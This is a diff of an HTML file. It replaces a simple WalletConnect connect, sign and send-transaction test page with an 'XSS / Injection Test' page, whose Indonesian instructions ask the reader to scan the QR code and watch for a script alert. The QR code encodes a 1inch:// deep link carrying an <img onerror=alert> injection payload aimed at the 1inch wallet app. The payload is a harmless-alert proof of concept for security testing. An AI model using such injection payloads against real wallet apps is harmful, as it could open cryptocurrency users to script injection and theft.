@@ -3,69 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WalletConnect Simple Test</title>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <title>XSS Test - WalletConnect</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <style>
-        body { font-family: Arial; background:#111; color:#0f0; padding:20px; text-align:center; }
-        button { padding:18px; margin:15px 0; width:90%; background:#0066ff; color:white; border:none; border-radius:10px; font-size:17px; }
-        pre { text-align:left; background:#1a1a2e; padding:15px; border-radius:8px; margin-top:20px; }
+        body { font-family: Arial; background:#000; color:#0f0; padding:20px; text-align:center; }
     </style>
 </head>
 <body>
-    <h1>WalletConnect Simple Test</h1>
-    <button onclick="connectWC()">🔗 Connect WalletConnect</button>
-    <button onclick="signMessage()">Sign Message</button>
-    <button onclick="sendTestTx()">Send Test TX</button>
+    <h1>XSS / Injection Test for WalletConnect</h1>
 
-    <pre id="log"></pre>
+    <div id="qrcode"></div>
+    <p><strong>Scan QR ini di WalletConnect</strong></p>
 
     <script>
-        let provider;
+        const payload = `1inch://connect?data=<img src=x onerror=alert('XSS in 1inch WalletConnect')>`;
 
-        function log(msg) {
-            document.getElementById('log').innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-        }
+        new QRCode(document.getElementById("qrcode"), {
+            text: payload,
+            width: 300,
+            height: 300,
+            colorDark : "#ffffff",
+            colorLight : "#000000"
+        });
 
-        async function connectWC() {
-            try {
-                provider = new WalletConnectProvider({
-                    rpc: { 1: "https://ethereum.publicnode.com" },
-                    qrcodeModalOptions: { mobileLinks: ["1inch"] }
-                });
-
-                await provider.enable();
-                log("✅ WalletConnect Connected!");
-                log("Account: " + provider.accounts[0]);
-            } catch (e) {
-                log("Connect Error: " + e.message);
-            }
-        }
-
-        async function signMessage() {
-            if (!provider) return log("Connect dulu!");
-            try {
-                const msg = "Test sign from WalletConnect";
-                const sig = await provider.request({ method: "personal_sign", params: [msg, provider.accounts[0]] });
-                log("✅ Signature OK!");
-            } catch (e) {
-                log("Sign Error: " + e.message);
-            }
-        }
-
-        async function sendTestTx() {
-            if (!provider) return log("Connect dulu!");
-            try {
-                const tx = {
-                    from: provider.accounts[0],
-                    to: "0x0000000000000000000000000000000000000000",
-                    value: "0x16345785d8a0000"
-                };
-                const hash = await provider.request({ method: "eth_sendTransaction", params: [tx] });
-                log("✅ TX Sent! Hash: " + hash);
-            } catch (e) {
-                log("TX Error: " + e.message);
-            }
-        }
+        // Test reflected XSS di halaman ini
+        console.log("%cXSS Test Payload Ready", "color:red; font-size:18px");
     </script>
+
+    <p>Coba scan QR Code di atas menggunakan 1inch Wallet atau aplikasi WalletConnect lain.</p>
+    <p>Perhatikan apakah ada alert atau eksekusi script.</p>
 </body>
 </html>
